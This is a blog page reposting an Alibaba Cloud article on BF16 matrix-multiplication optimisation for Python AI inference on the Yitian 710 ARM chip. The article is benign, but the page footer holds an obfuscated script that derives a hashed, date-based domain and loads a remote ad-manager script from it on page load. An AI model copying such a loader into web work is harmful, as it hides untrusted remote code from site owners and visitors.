<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>解读最佳实践：倚天710 ARM芯片的 Python&#43;AI 算力优化 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">解读最佳实践：倚天710 ARM芯片的 Python&#43;AI 算力优化</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <p style="text-align:justify">编者按：在刚刚结束的 PyCon China 2022 大会上，龙蜥社区开发者朱宏林分享了主题为《ARM 芯片的 Python+AI 算力优化》的技术演讲。本次演讲，作者将向大家介绍他们在倚天 710 ARM 芯片上开展的 Python+AI 优化工作，以及在 ARM 云平台上部署 Python+AI 任务的最佳实践。</p> 
<p style="text-align:justify">以下为本次演讲内容：</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/1f/43/BDm34E7t_o.png"></p> 
<p>（图/朱宏林现场演讲）</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/c7/da/M0UHxkvw_o.png"></p> 
<p style="text-align:justify">我们的场景是 ARM 平台的和 AI 相关的任务，主要的目标是<strong>进行性能优化</strong>，具体来说我们首先关注的是深度学习推理任务（inference task），主要原因也是来自于业务需求。</p> 
<p style="text-align:justify">这里说的 ARM 平台不是我们理解的终端设备，比如手机之类的，而是指服务端平台。在大家印象中，AI 任务，特别是深度学习的程序一般是跑在 GPU 或者 x86 的 CPU 上，出于<strong>功耗、成本、性能</strong>等因素的考虑，云厂商逐步开始建设 ARM 架构的服务平台，这是一个趋势。当然 ARM 平台还不是很成熟，许多软件还无法成功跑起来，更不要说提升性能了。</p> 
<p style="text-align:justify">我们想要吸引一部分用户将AI应用从原先的 x86 平台上迁移到 ARM 平台上。这就要求 ARM 平台能提供更好的性能，或者更好的性价比。所以说<strong>如何整合 Python+AI 的相关软件使其发挥最好的性能成为了我们关注的重点</strong>。</p> 
<p style="text-align:justify">下文的分享整体分为两部分，一部分是介绍我们进行的优化工作，主要是跟矩阵乘法相关的优化，第二部分是关于 Python AI 应用在 ARM 云平台-倚天 710 上的最佳实践。</p> 
<h3 style="text-align:justify">一、优化工作介绍</h3> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/3a/e0/oy8L41n9_o.png"></p> 
<p style="text-align:justify">前面说我们的优化是和矩阵乘法相关的，那首先需要说明为什么我们会关注到这个。</p> 
<p style="text-align:justify">这里有一个绕不开的场景就是<strong>深度学习</strong>，不管是前几年知名的 AlphaGo，还是当前火热的 ChatGPT，都用到了大量深度学习的技术，深度学习本身只是AI的一个分支，但却影响广泛，不容忽视。所以我们从深度学习开始切入，从当前最广泛使用的深度学习框架，TensorFlow 和 PyTorch 开始。此外，我们还需要<strong>结合硬件场景</strong>，即前面说到的 ARM 服务端平台，对于阿里云来说就是结合倚天 710 芯片。</p> 
<p style="text-align:justify">深度学习的实现中包含大量的矩阵乘法，甚至有文章直接写出矩阵乘法是深度学习的核心。举个例子，我们熟知的卷积操作，实际上经过一系列的转换后，输入特征和卷积核会被转换为两个矩阵，然后进行矩阵乘法，输出的结果再解码成特征图，就完成了卷积。除此以外，全连接层也由矩阵乘法实现，当前<strong>流行的 Transformers 结构</strong>，被包括 ChatGPT 在内的各类 NLP 模型所使用，也包含大量矩阵乘法操作。</p> 
<p style="text-align:justify">我们可以看一些例子：</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/96/a4/fIrwPWkA_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/a2/ed/PZ8aHvKl_o.png"></p> 
<p style="text-align:justify">可以看到，像 AlexNet、ResNet-50 之类的模型，在进行推理时，大约 90% 计算耗时在执行矩阵乘法。即使对矩阵乘法做一些微小的优化，影响也是很广泛的。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/2b/db/v1KrE4i8_o.png"></p> 
<p style="text-align:justify">我们前面说的矩阵乘法，更准确的叫法是 GEMM，通用矩阵乘法，其实还包含系数和累加操作。但是时间复杂度仍然是 MNK 级别，主要还在于 AB 两个矩阵相乘。直观来看，<strong>深度学习涉及的矩阵乘法计算量很大</strong>，比如常见的卷积操作可能就涉及 5000 万次计算，所以优化就显得很有必要，右下图是最朴素的三层循环迭代法，这种做法通常非常慢，计算机科学家做了许多努力，从优化内存布局和利用向量指令出发，能够将<strong>性能提升 10 倍以上</strong>。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/58/eb/VFGaoVkT_o.png"></p> 
<p style="text-align:justify">内存布局主要分两步，<strong>第一步是对矩阵进行分块</strong>，即对于一个超大的矩阵，我们并不是一个一个按顺序计算，而是将矩阵切分为一个一个小块，分小块计算。第二步是对分出的小块，内部的元素序列进行重排，例如原来是按行排列的矩阵，那可能第一行四个计算好了，就需要取第二行的前四个，但是要取第二行就需要指针移动很长的距离，很容易造成 cache 不命中，于是需要重排，使得他们在内存上连续。优化内存布局主要目的是为了增加 cache 命中率，减少访存次数。</p> 
<p style="text-align:justify"><strong>其次是利用向量化指令</strong>，类似 AVX 对于 x86 设备，NEON 对于 ARM 设备。向量化指令本质上是为了同时对多个数据进行计算，例如我们要对四组数据分别进行乘法，那么常规情况下需要执行四次，如果将它们对应放入向量寄存器中，只需要一条向量化指令，就可以同时得出四个结果，计算效率得到提升。当然这个是需要硬件支持。</p> 
<p style="text-align:justify">因为 AI 推理大量使用了矩阵乘法，如今也有许多硬件对矩阵运算进行了加速：</p> 
<ul>
<li style="text-align:justify">NVIDIA Volta 架构引入了tensor core，可以高效地以混合精度处理矩阵乘</li>
<li style="text-align:justify">Intel AMX(Advanced Matrix Extensions) 通过脉动阵列在硬件层面支持矩阵乘</li>
<li style="text-align:justify">ARM SME(Scalable Matrix Extension) 支持向量外积运算，加速矩阵乘</li>
</ul>
<p style="text-align:justify">目前市面上尚没有可以大规模使用的支持 AMX 或者 SME 的硬件，在这个阶段我们应该<strong>如何优化 CPU 上的 AI 推理算力</strong>呢？我们首先要了解 BF16 数据类型。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/01/3d/tHiheYEO_o.png"></p> 
<p style="text-align:justify">BF16(全称 Brain Floating Point)，是由 Google Brain 开发设计的 16 位浮点数格式。</p> 
<p style="text-align:justify">相比传统的 FP16 位浮点数，BF16 拥有和 FP32 一样的取值范围，但是精度较差。但对于深度学习来说，较低的精度并不显著影响结果，而较低的表示范围则会显著影响模型训练的好坏。</p> 
<p style="text-align:justify">此外，BF16 还具有转换方便的特点，BF16 和 FP32 的互转只需要截断或填充尾数即可。</p> 
<p style="text-align:justify">使用 BF16 还可以节约一半的内存，紧凑的内存表示通常意味着更高的计算吞吐。</p> 
<p style="text-align:justify">最后，我们也有了硬件指令支持，可以直接对 BF16 数据进行操作。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/73/c7/q397ei5f_o.png"></p> 
<p style="text-align:justify">需要说明的是 BF16 的扩展包含在 ARMv8.6 设备上，当然倚天 710 是 ARMv9 的指令集，同样支持。</p> 
<p style="text-align:justify">我们主要通过 BFMMLA 来进行矩阵乘法计算，例如对于包含 128bit 的向量寄存器的设备来说：</p> 
<ul>
<li style="text-align:justify">输入 A: 大小为 2*4 的 BF16 矩阵，按行存储</li>
<li style="text-align:justify">输入 B: 大小为 4*2 的 BF16 矩阵，按列存储</li>
<li style="text-align:justify">输出 C: 大小为 2*2 的 FP32 矩阵</li>
</ul>
<p style="text-align:justify">BFMMLA 单指令完成 16 次乘法和 16 次加法，计算吞吐非常高。</p> 
<p style="text-align:justify">当然这时候如果我们需要 C 是 BF16 类型的话，就需要应用转换指令，例如向量化指令 BFCVT，加速转换过程。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/84/07/VZRLbPce_o.png"></p> 
<p style="text-align:justify">我们的目标还是给 tensorflow 和 pytorch 用户提供加速，这是整体的流程图，对于一个 AI 推理任务，实际上不论是 TensorFlow 还是 PyTorch 都不会自己直接去计算，而是叫个专门的计算后端，在 ARM 主要是两个，<strong>一个是 ARM Compute Library，另一个是 OpenBLAS</strong>，他们之间的关系如右图。</p> 
<p style="text-align:justify">TensorFlow 在最近的版本中开始采用 oneDNN + ACL 作为计算后端，oneDNN 也是一层皮，实际的计算仍然是 ACL。用户实际上只需要设置一个环境变量，就可以在不该动代码的情况下获得 BF16 加速。这个改进是由 ARM 公司的研发人员首先完成了。具体操作例子如下：</p> 
<pre><code># 假设 resnet.py 包含用户写的模型推理的代码
DNNL_DEFAULT_FPMATH_MODE=BF16 python3 resnet.py</code></pre> 
<p style="text-align:justify">PyTorch的情况比较复杂，PyTorch 支持 OneDNN + ACL，但无法很好的发挥性能，同时 PyTorch 支持 OpenBLAS 后端，因此可以通过 OpenBLAS 来享受 ARM bf16 扩展带来的性能收益。</p> 
<p style="text-align:justify">OpenBLAS 的 BF16 的 GEMM 优化是由龙蜥社区理事单位阿里巴巴贡献的，于此同时，我们为了方便用户使用，也在 PyTorch 中加入了一个API，用户在模型执行前添加一行torch.set_float32_fast_math_mode("BF16")，就可以获得 BF16 加速，不必修改其他代码（需要说明，这个api还没有合入PyTorch，所以目前要使用我们提供的pytorch镜像才可以获得）。操作例子如下：</p> 
<pre><code># ...
# 在模型执行前设置fast math mode
torch.set_float32_fast_math_mode("BF16")
# ...
# 执行模型
pred = model(x)
# ...</code></pre> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/4c/6f/UmOQjOdo_o.png"></p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/82/cd/nz7riiRJ_o.png"></p> 
<p style="text-align:justify">之后是一些性能测试的展示，我们测试了 OpenBLAS 纯矩阵计算的性能对比。分别记录了 GFLOPS 和执行时间两个指标。</p> 
<p style="text-align:justify">然后测试 TensorFlow 和 PyTorch 的性能对比，在对比中，我们可以看到，得益于 BF16 扩展，<strong>最新的 ECS ARM 平台上的性能优于 x86 平台（g7）</strong>。</p> 
<p class="img-center"><img alt="" src="https://images2.imgbox.com/70/7c/tmf7Geo3_o.png"></p> 
<h3 style="text-align:justify">二、Python AI应用在ARM云平台-倚天710上的最佳实践</h3> 
<p style="text-align:justify">现在介绍一下在 ARM 平台，特别是倚天 710 的用户，使用 TensorFlow 或 PyTorch 的最佳实践。</p> 
<p style="text-align:justify">要知道软件版本的选择十分重要，随意选择 tensorflow 或者 pytorch 包可能遭遇：</p> 
<ul>
<li style="text-align:justify">未适配 ARM 架构，安装失败</li>
<li style="text-align:justify">软件未适配 BF16 扩展或者环境参数有误，无法发挥硬件的全部算力，性能打折</li>
<li style="text-align:justify">需要精心选择计算后端，例如目前 pytorch下OpenBLAS 较快</li>
</ul>
<p style="text-align:justify">在 TensorFlow 上，我们可以选择最新的两个官方版本， 2.10.1 或者 2.11.0（最新版本），才能够获得 ACL 的 BF16 加速。用户也可以选择阿里云的镜像，这个和 pip 安装的其实是一样的，没有区别。</p> 
<p style="text-align:justify">对于 PyTorch 用户，官方版本只有在最新的 1.13.0 才能够获得 ACL 加速，但是正如前面所说的，实际性能并不突出。阿里云则提供了带最新 OpenBLAS 的 PyTorch，在 docker 拉取时标注 torch_openblas 就可以获得。此外，我们也提供了modelzoo 镜像，包含模型的测试代码和验证代码。</p> 
<p style="text-align:justify">目前我们仍然在进行相关的工作，期待后续能为大家提供更加完善的镜像。欢迎大家入群一起探索相关技术。</p> 
<p style="text-align:justify">AI SIG 主页地址：<a href="https://link.zhihu.com/?target=https%3A//openanolis.cn/sig/AI_SIG" title="https://openanolis.cn/sig/AI_SIG">https://openanolis.cn/sig/AI_SIG</a></p> 
<p style="text-align:justify"><strong><a href="https://link.zhihu.com/?target=https%3A//click.aliyun.com/m/1000366593/" title="原文链接">原文链接</a></strong></p> 
<p style="text-align:justify"><strong>本文为阿里云原创内容，未经允许不得转载。</strong></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>